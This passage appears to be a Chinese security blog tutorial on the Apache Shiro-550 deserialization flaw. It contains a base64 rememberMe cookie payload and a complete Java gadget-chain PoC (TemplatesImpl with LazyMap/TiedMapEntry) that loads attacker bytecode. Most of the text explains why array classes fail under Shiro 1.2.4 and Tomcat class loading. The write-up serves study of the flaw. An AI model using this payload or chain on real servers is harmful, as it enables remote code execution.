<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">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</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修改<code>rememberme</code>字段发送</p>
<p><strong>注意 commons collections 版本为3.2.1 JDK版本 以及序列化文件及时替换</strong></p>
<p>完整<code>poc</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TemplatesImpl恶意类构造</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\32768\\Desktop\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改内部属性</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan0000</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chuan0000);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, obj);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">obj2.put(foo, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(lazyMap, chuan0);</span><br><span class="line">map.clear();</span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602142234621.png" alt="image-20260214223415383" style="zoom: 33%;" />

<p><code>CC6</code>链也叫做<code>CC11</code>，好用的原因主要是 能够像 cc2 一样加载恶意字节码，同时受影响的版本还是 CommonsCollections 3.1-3.2.1 这个版本相对 CommonsCollections 4.0 范围应该会更广一些，<strong>而且也可以完美的适用于 shiro 漏洞</strong></p>
<p><strong>Shiro不是遇到Tomcat就一定会有数组这个问题</strong></p>
<p><strong>Shiro-550的修复并不意味着反序列化漏洞的修复，只是默认Key被移除了</strong></p>
<h3 id="3-shiro数组问题"><a href="#3-shiro数组问题" class="headerlink" title="3.shiro数组问题"></a>3.<code>shiro</code>数组问题</h3><p><code>ClassResolvingObjectInputStream</code></p>
<p>普通的 Java 反序列化使用 <code>ObjectInputStream</code>，它在读取类名并加载类时，会调用 <code>resolveClass</code> 方法。</p>
<p><code>Shiro</code> 为了适配不同的 Web 容器（比如 Tomcat, Jetty）和复杂的 <code>ClassLoader</code> 环境，认为原生的 <code>resolveClass</code> 不够用，于是自己继承并重写了这个类，叫做 <strong><code>org.apache.shiro.io.ClassResolvingObjectInputStream</code></strong>。</p>
<p>在 <code>Shiro</code> 1.2.4 中，它的 <code>resolveClass</code> 逻辑大概是这样的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Shiro 1.2.4 的实现</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 关键点：它使用 ClassUtils.forName 来加载类</span></span><br><span class="line">        <span class="keyword">return</span> ClassUtils.forName(osc.getName()); </span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>正常<code>java</code>逻辑为</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152018358.png" alt="image-20260215201747984" style="zoom:50%;" />

<p>使用<code>Class.forName(&quot;[Ljava.lang.String;&quot;)</code>加载</p>
</li>
</ul>
<p><code>ClassUtils.forName(osc.getName())</code>的具体逻辑是</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152012994.png" alt="image-20260215201241894" style="zoom:50%;" />

<p>遇到一个<strong>致命缺陷：<code>ClassLoader.loadClass</code> 不认识数组</strong></p>
<p>问题的根源转移到了 <code>ClassUtils.forName()</code> 里面。</p>
<ol>
<li><p><strong>Java 的原生机制</strong>：</p>
<ul>
<li><code>Class.forName(&quot;[Ljava.lang.String;&quot;)</code>：<strong>可以</strong>加载 String 数组。</li>
<li><code>ClassLoader.loadClass(&quot;[Ljava.lang.String;&quot;)</code>：<strong>不可以</strong>加载数组，会直接抛出 <code>ClassNotFoundException</code>。</li>
</ul>
</li>
<li><p><strong>Shiro 1.2.4 的 bug</strong>：</p>
<p>Shiro 的 <code>ClassUtils.forName</code> 最终逻辑是获取当前的 ClassLoader，然后直接调用 <code>loadClass(name)</code>。</p>
<p><strong>当反序列化流中出现一个数组类型（比如 <code>[Lorg.apache.commons.collections.Transformer;</code>）时：</strong></p>
<ol>
<li>Shiro 拿到类名：<code>[Lorg.apache.commons.collections.Transformer;</code></li>
<li>Shiro 调用 <code>loader.loadClass(&quot;[Lorg.apache.commons.collections.Transformer;&quot;)</code>。</li>
<li><code>loadClass</code> 懵了，它不懂这个 <code>[</code> 开头的语法，直接报错。</li>
<li>反序列化中断，Exploit 失败。</li>
</ol>
</li>
</ol>
<blockquote>
<p><strong>总结：</strong> Shiro 1.2.4 的类加载器封装过于简单，直接把数组的底层签名（Signature）丢给了不懂数组签名的 <code>loadClass</code> 方法。</p>
</blockquote>
<h3 id="4-forname与loadclass"><a href="#4-forname与loadclass" class="headerlink" title="4.forname与loadclass"></a>4.<code>forname</code>与<code>loadclass</code></h3><p><code>Class.forName(&quot;[Ljava.lang.String;&quot;)</code></p>
<p><code>Class.forName</code> 是一个静态方法。当你调用它时，它实际上是在调用一个 <strong>Native（本地）方法</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 最终调用的是这个 native 方法</span></span><br><span class="line">    <span class="keyword">return</span> forName0(className, <span class="literal">true</span>, ClassLoader.getClassLoader(caller), caller);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JVM 内部实现的 C++ 代码逻辑（Hotspot）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> Class&lt;?&gt; forName0(...) </span><br></pre></td></tr></table></figure>

<p><strong>它能加载数组</strong></p>
<p>这个 Native 方法直接对接 JVM 核心。</p>
<ol>
<li><strong>解析语法</strong>：JVM 内部的 C++ 代码会解析传入的字符串。</li>
<li><strong>识别数组</strong>：当它看到开头是 <code>[</code> 时，JVM 明白：“哦，你要的是一个数组”。</li>
<li><strong>动态生成</strong>：数组类在 Java 中<strong>不存在对应的 <code>.class</code> 文件</strong>，它们是由 JVM 在运行时<strong>动态生成</strong>的。</li>
<li><strong>递归加载</strong>：JVM 会解析出数组的元素类型（比如 <code>Ljava.lang.String;</code> 去掉 <code>L</code> 和 <code>;</code> 变成 <code>java.lang.String</code>），然后加载这个元素类，最后组装成一个数组类返回。</li>
</ol>
<p><strong>结论</strong>：<code>Class.forName</code> 是为了“解析并获取类对象”设计的，它懂得 Java 所有的类型语法（包括数组）。</p>
<p><code>ClassUtils.forName(osc.getName())</code><strong>加载具体逻辑</strong></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152012994.png" alt="image-20260215201241894" style="zoom:50%;" />

<p>作用是<strong>根据类名（全限定名）加载并返回对应的 <code>Class</code> 对象</strong>。</p>
<p>它采用了一种**“三级跳”的加载策略**，目的是为了在复杂的 Java 环境（如 Web 容器、<code>OSGi</code>、多线程环境）中尽可能成功地找到类。</p>
<p><strong>“三级加载”逻辑</strong></p>
<p>这个方法按顺序尝试使用三个不同的 <code>ClassLoader</code>（类加载器）来加载类，一旦加载成功立即返回，只有当三个都失败时才抛出异常。</p>
<p><strong>第一步：尝试线程上下文类加载器 (Thread Context ClassLoader)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：首先尝试从当前线程的上下文中获取类加载器来加载。</li>
<li><strong>原因</strong>：这是最常用的方式，尤其是在 Web 容器（如 Tomcat）或框架（如 Spring）中。主线程通常被设置了能看到 Web 应用 <code>/WEB-INF/lib</code> 下所有类的加载器。如果这个加载器找不到，说明该类可能不在应用层级。</li>
</ul>
<p><strong>第二步：尝试当前类加载器 (Current ClassLoader)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// ... 日志记录 ...</span></span><br><span class="line">    clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：如果第一步失败，使用加载了 <code>ClassUtils</code> 这个类本身的加载器。</li>
<li><strong>原因</strong>：这通常是加载 <code>Shiro</code> 核心库的加载器。在某些环境中（如 <code>OSGi</code>），线程上下文加载器可能为空或受限，但 Shiro 自身所在的类加载器一定存在且能看到 <code>Shiro</code> 相关的类。</li>
</ul>
<p><strong>第三步：尝试系统&#x2F;应用类加载器 (System&#x2F;Application ClassLoader)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// ... 日志记录 ...</span></span><br><span class="line">    clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：最后尝试 <code>ClassLoader.getSystemClassLoader()</code>。</li>
<li><strong>原因</strong>：这是保底操作，对应 <code>CLASSPATH</code> 环境变量下的类。如果前两个都找不到，可能是 <code>JDK</code> 自带的类或者是环境配置极其基础的类。</li>
</ul>
<p>如果三者都返回 <code>null</code>（或者抛出异常被 Accessor 捕获返回 null），则抛出 <code>UnknownClassException</code>。</p>
<p><strong>尝试加载<code>Tranformer</code>数组时，他是<code>web</code>容器下打包的<code>java</code>文件，当然会由第一种类加载器加载</strong></p>
<p>具体逻辑如下</p>
<p><code>THREAD_CL_ACCESSOR</code>本质是<code>ExceptionIgnoringAccessor</code></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152059838.png" alt="image-20260215205906753" style="zoom:50%;" />

<p>接着是<code>ParallelWebappClassLoader</code>类加载器</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152102462.png" alt="image-20260215210231363" style="zoom:33%;" />

<p><strong>也就是 tomcat 类加载逻辑的最底层类加载器</strong></p>
<ul>
<li><p><strong>这里强制步入出问题的话需要到maven里配置tomcat核心包</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.81<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>原因是 <code>Maven</code> 列表里没有 Tomcat，因为你的项目本身不需要 <code>Tomcat</code> 的代码就能<strong>编译</strong>通过你只依赖了 <code>javax.servlet-api</code> 接口</p>
<p>但点击“运行&#x2F;调试”时，<code>IntelliJ IDEA</code> 会启动一个<strong>外部的 Tomcat 服务器</strong>来运行代码，记得下载源代码</p>
</li>
</ul>
<p><code>org/apache/catalina/loader/WebappClassLoaderBase#loadClass</code></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152120713.png" alt="image-20260215212044656" style="zoom:67%;" />

<p>接着进入<code>tomcat</code>核心类加载流程</p>
<p><code>org/apache/catalina/loader/WebappClassLoaderBase#loadClass</code></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152218167.png" alt="image-20260215221850008" style="zoom:50%;" />

<p>这个的具体流程如下</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152222704.png" alt="image-20260215222227635" style="zoom:50%;" />

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delegate：如果你在 server.xml 或 context.xml 中配置了 &lt;Loader delegate=&quot;true&quot;/&gt;，那么这里为 true，Tomcat 就会退化成标准的双亲委派模式（极少这样配置）。</span><br><span class="line"></span><br><span class="line">filter(name, true)：关键点！ Tomcat 有一份“黑名单”（package triggers），包含 javax.*, org.apache.tomcat.* 等包名。</span><br><span class="line"></span><br><span class="line">如果类名匹配这些包（比如 javax.servlet.Servlet），必须强制委托给父加载器加载，不能让 Web 应用自己加载。这是为了保证 Servlet API 的统一性。</span><br></pre></td></tr></table></figure>

<p><strong>第一阶段：尝试委托给父加载器</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (1) Delegate to our parent if requested</span></span><br><span class="line"><span class="keyword">if</span> (delegateLoad) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    clazz = Class.forName(name, <span class="literal">false</span>, parent);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：如果开启了 <code>delegate</code> 或者是属于 <code>javax.*</code> 等受保护的包，<strong>立刻</strong>让父加载器（CommonClassLoader）去加载。</li>
<li><strong>注意</strong>：对于普通的业务类（如 <code>com.mycompany.MyService</code>），<code>delegateLoad</code> 通常是 <code>false</code>，这段代码<strong>不会执行</strong>。</li>
</ul>
<p><strong>第二阶段：Web 应用自己加载—— 核心差异点</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (2) Search local repositories</span></span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">    log.debug(<span class="string">&quot;  Searching local repositories&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    clazz = findClass(name);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：调用 <code>findClass(name)</code>。这个方法会去扫描你的 WAR 包里的：<ol>
<li><code>/WEB-INF/classes</code> 目录</li>
<li><code>/WEB-INF/lib/*.jar</code> 文件</li>
</ol>
</li>
<li><strong>意义</strong>：<strong>这就是 Tomcat “打破双亲委派”的地方！</strong><ul>
<li>标准 Java 加载器是“先问爸爸，爸爸没有我再找”。</li>
<li>Tomcat 是“<strong>先看我自己有没有，我有就直接用</strong>”（除非是 <code>JDK</code> 核心类或受保护的包）。</li>
</ul>
</li>
</ul>
<p><strong>第三阶段：无条件委托给父加载器 (3)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (3) Delegate to parent unconditionally</span></span><br><span class="line"><span class="keyword">if</span> (!delegateLoad) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    clazz = Class.forName(name, <span class="literal">false</span>, parent);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：如果自己（Web 应用）没找到这个类，那么最后再去求助父加载器（<code>CommonClassLoader</code>）。</li>
<li><strong>场景</strong>：比如加载 <code>SQL</code> 驱动、日志门面（<code>SLF4J</code>）或者 Tomcat 提供的共享库（如果是放在 <code>tomcat/lib</code> 下的）。</li>
</ul>
<p><strong>加载<code>Tranformer</code>数组时</strong></p>
<p> <code>Transformer</code> 类位于 Web 应用的 <code>WEB-INF/lib</code> 下。</p>
<p>当 Shiro 调用 <code>WebappClassLoader.loadClass(&quot;...Transformer[]&quot;)</code> 时，发生了以下连环惨案：</p>
<p><strong>第 (2) 步：Web 应用自己找</strong></p>
<p>代码：<code>clazz = findClass(name);</code></p>
<ul>
<li><strong>Web 加载器的逻辑</strong>：它会试图去 <code>WEB-INF/classes</code> 或 <code>WEB-INF/lib</code> 里找一个名字叫 <code>...Transformer[].class</code> 或 <code>[L...Transformer;.class</code> 的<strong>物理文件</strong></li>
<li><strong>结果</strong>：<strong>失败</strong></li>
<li><strong>原因</strong>：数组类是 <code>JVM</code> 在内存中动态生成的，硬盘上根本不存在对应的 <code>.class</code> 文件。所以 <code>findClass</code> 必定返回 null 或抛出异常</li>
</ul>
<p><strong>第 (3) 步：委托给父加载器</strong></p>
<p>代码：<code>clazz = Class.forName(name, false, parent);</code></p>
<ul>
<li>动作：Web 加载器说：“我自己找不到文件，爸爸（Common&#x2F;System ClassLoader），你帮我加载这个数组吧”</li>
<li>父加载器的逻辑：<ol>
<li>父加载器收到请求：加载 <code>Transformer[]</code>。</li>
<li><code>JVM</code> 规定：要创建数组类，<strong>必须先加载数组的元素类型（Element Type）</strong>，也就是 <code>Transformer</code> 类</li>
<li>父加载器开始在<strong>自己的管辖范围</strong>（如 Tomcat&#x2F;lib 或 JDK&#x2F;lib）里找 <code>Transformer</code></li>
</ol>
</li>
<li>结果：失败</li>
<li>致命原因（类可见性）：<ul>
<li><code>Transformer</code> 在 <code>WEB-INF/lib</code> 里</li>
<li>父加载器（Common）<strong>看不见</strong>儿子的 <code>WEB-INF/lib</code></li>
<li>既然连元素类型 <code>Transformer</code> 都找不到，数组 <code>Transformer[]</code> 自然也就无法创建</li>
</ul>
</li>
</ul>
<p><strong>但是如果是加载 jdk 自身类的数组，可以直接加载</strong></p>
<table>
<thead>
<tr>
<th><strong>类加载器</strong></th>
<th><strong>JDK 类 (java.lang.*)</strong></th>
<th><strong>Tomcat 类 (org.apache.catalina.*)</strong></th>
<th><strong>Web 应用类 (WEB-INF&#x2F;lib)</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Bootstrap (祖父)</strong></td>
<td>看得见</td>
<td>瞎了</td>
<td>瞎了</td>
</tr>
<tr>
<td><strong>Common (父亲)</strong></td>
<td>看得见</td>
<td>看得见</td>
<td><strong>瞎了 (关键原因)</strong></td>
</tr>
<tr>
<td><strong>Webapp (儿子)</strong></td>
